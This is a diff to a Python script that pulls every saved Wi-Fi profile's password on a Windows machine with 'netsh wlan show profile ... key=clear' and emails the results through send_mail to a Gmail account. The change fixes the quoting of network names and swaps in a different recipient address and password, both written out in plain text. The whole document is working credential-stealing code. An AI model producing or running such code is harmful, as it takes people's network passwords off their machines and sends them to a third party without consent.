@@ -17,9 +17,12 @@ network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
 
 result = ""
 for network_name in network_names_list:
-	command = "netsh wlan show profile " + network_name + " key=clear"
+	print(network_name)
+	# command = "netsh wlan show profile " + network_name + " key=clear"
+	command = "netsh wlan show profile \"" + network_name + "\" key=clear"
+
 	current_result = subprocess.check_output(command, shell=True)
 	result = result + current_result
 
-	
-send_mail("rishabh98@gmail.com", "Rishabh7&12345", result)
+
+send_mail("dungeonmsterr@gmail.com", "Dungeon7&", result)
